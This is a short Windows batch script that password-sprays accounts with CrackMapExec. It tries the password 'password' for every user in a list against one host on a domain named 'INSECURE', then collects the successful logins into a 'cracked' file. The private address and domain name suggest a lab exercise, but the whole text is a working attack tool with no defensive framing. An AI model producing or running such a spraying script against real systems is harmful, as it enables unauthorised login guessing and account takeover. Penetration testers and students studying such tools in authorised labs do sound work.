
@echo off 

:: set these variables first before running the script 

set "userlist=users.txt"
set "target=192.168.80.50"
set "domain=INSECURE"

:: password 
del  cme_brute_bat_password.txt
echo "Running cme - trying password on users.txt
for /F "delims=" %%a in (%userlist%) do (
crackmapexec.exe %target% -u %%a  -p password  >> cme_brute_bat_password.txt
)
powershell "Get-Content cme_brute_bat_password.txt | findstr [+] | sort-object| Get-Unique > cme_brute_bat_cracked_password.txt

echo ""
echo ""
echo "################ FINISHED ################"
echo ""
type cme_brute_bat_cracked_password.txt